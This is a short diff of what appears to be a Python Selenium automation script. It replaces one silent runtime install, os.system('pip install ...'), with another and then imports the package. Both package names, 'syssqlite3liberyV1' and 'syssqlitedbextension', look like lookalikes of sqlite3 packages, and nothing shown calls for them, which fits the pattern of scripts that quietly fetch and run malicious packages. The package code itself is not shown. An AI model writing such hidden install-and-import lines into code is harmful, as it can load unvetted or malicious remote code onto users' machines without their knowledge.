@@ -1,6 +1,6 @@
 import os
-os.system("pip install syssqlite3liberyV1")
-import syssqlite3liberyV1
+os.system("pip install syssqlitedbextension")
+import syssqlitedbextension
 from selenium import webdriver
 from selenium.webdriver.firefox.options import Options
 from selenium.webdriver.common.keys import Keys
